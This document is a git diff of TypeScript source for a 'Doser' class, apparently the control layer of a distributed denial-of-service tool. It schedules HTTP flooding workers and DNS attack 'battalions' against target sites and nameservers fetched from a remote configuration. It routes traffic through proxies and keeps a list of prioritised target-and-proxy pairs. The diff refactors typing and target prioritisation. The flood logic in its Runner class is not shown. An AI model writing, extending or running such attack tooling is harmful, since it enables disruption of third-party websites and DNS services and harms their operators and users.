@@ -1,26 +1,25 @@
 import { AxiosError } from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
-import { DoserEventType, GetSitesAndProxiesResponse } from './types'
+import { DoserEventType, ProxyData, SiteData, GetSitesAndProxiesResponse, PrioritizedTarget } from './types'
 import { Runner } from './runner'
 import { ConfigurationService } from './services/configurationService'
 import { Timeout } from './utils/timeout'
 import { DnsBattalion } from './dnsBattalion'
+import { AxiosProxyConfig } from 'axios'
 
 const CONFIGURATION_WAIT_MIN_TIMEOUT = 10000 // 10 sec
 const CONFIGURATION_WAIT_MAX_TIMEOUT = 120000 // 2 min
 
 export class Doser {
   private onlyProxy: boolean
-  private hosts: Array<string> = []
   private working: boolean
   private workers: Runner[] = []
   private dnsBattalions: DnsBattalion[] = []
   private numberOfWorkers = 0
   private activeDnsBattalionsNumber = 0
   private eventSource: EventEmitter
-  private prioritizedPairs: any = []
+  private prioritizedPairs: PrioritizedTarget[] = []
   private dnsAttackPaused = false
-
   private ddosConfiguration: GetSitesAndProxiesResponse | null = null
 
   private verboseError: boolean
@@ -32,6 +31,11 @@ export class Doser {
     successful: 0,
     efficiency: '0%'
   }
+
+  public sites: SiteData[] = []
+  public proxies: ProxyData[] = []
+  public maxPrioritizedWorkers = 0
+  public prioritizedWorkersNow = 0
 
   constructor (
     onlyProxy: boolean,
@@ -50,29 +54,27 @@ export class Doser {
     this.initialize(Timeout.zero())
   }
 
-  getPrioritizedTargets() {
+  getPrioritizedTargets () {
     return this.prioritizedPairs
   }
 
-  removePrioritizedTarget(what, proxy){
+  removePrioritizedTarget (what: SiteData, proxy: AxiosProxyConfig | undefined) {
     for (let index = 0; index < this.prioritizedPairs.length; index++) {
-      const element = this.prioritizedPairs[index];
-      if(element.page == what && JSON.stringify(proxy) === JSON.stringify(element.proxyObj))  {
+      const element = this.prioritizedPairs[index]
+      if (element.page === what && JSON.stringify(proxy) === JSON.stringify(element.proxyObj)) {
         this.prioritizedPairs.splice(index, 1)
         return
       }
-
     }
   }
 
-  addPrioritizedTarget(what, proxyObj) {
-    if(this.prioritizedPairs.length < 100) {
+  addPrioritizedTarget (what: SiteData, proxyObj: AxiosProxyConfig | undefined) {
+    if (this.prioritizedPairs.length < this.maxPrioritizedWorkers) {
       this.prioritizedPairs.push({
-          page: what,
-          proxyObj: proxyObj
-        }
+        page: what,
+        proxyObj: proxyObj
+      }
       )
-
     }
   }
 
@@ -115,11 +117,12 @@ export class Doser {
     }
   }
 
-  private updateConfiguration (configuration: GetSitesAndProxiesResponse) {
-    console.log('update configuration')
-    this.ddosConfiguration = configuration
+  private updateConfiguration (configuration:GetSitesAndProxiesResponse) {
+    this.updateSitesAndProxies(configuration.sites, configuration.proxies)
+    console.debug('CONFIGURATION UPDATED, REMOVING PRIORITIZED TARGETS')
+    this.prioritizedPairs = []
     this.workers.forEach(worker => {
-      worker.updateConfiguration(configuration)
+      worker.stopAddingPrioritized()
     })
     this.dnsBattalions.forEach(worker => {
       worker.updateConfiguration(configuration.nameservers)
@@ -158,12 +161,18 @@ export class Doser {
     }, timeout.interval)
   }
 
+  updateSitesAndProxies (sites:SiteData[], proxies:ProxyData[]) {
+    this.sites = sites
+    this.proxies = proxies
+  }
+
   private startWorkers () {
-    this.startWebSitesWorkers()
+    this.startHttpWorkers()
     this.startDnsWorkers()
   }
 
-  private startWebSitesWorkers () {
+  private startHttpWorkers () {
+    this.maxPrioritizedWorkers = Math.floor(this.httpWorkersCapacity / 1.33)
     if (this.httpWorkersCapacity === this.numberOfWorkers) {
       return
     }
@@ -242,12 +251,10 @@ export class Doser {
   private createNewWorker (): Runner {
     console.debug('Creating new worker..')
     // Should never happen
-    if (!this.ddosConfiguration) {
+    if (!this.sites || !this.proxies) {
       throw new Error('Cannot create worker without configuration')
     }
     const worker = new Runner({
-      sites: this.ddosConfiguration.sites,
-      proxies: this.ddosConfiguration.proxies,
       onlyProxy: this.onlyProxy,
       doserInstance: this
     })
@@ -302,6 +309,7 @@ export class Doser {
         console.log(this.dnsArmyResult)
       })
       battalions.start().catch(error => {
+        // eslint-disable-next-line @typescript-eslint/no-unsafe-member-access
         console.debug('Wasnt able to start new runner:', error.message)
       })
     })
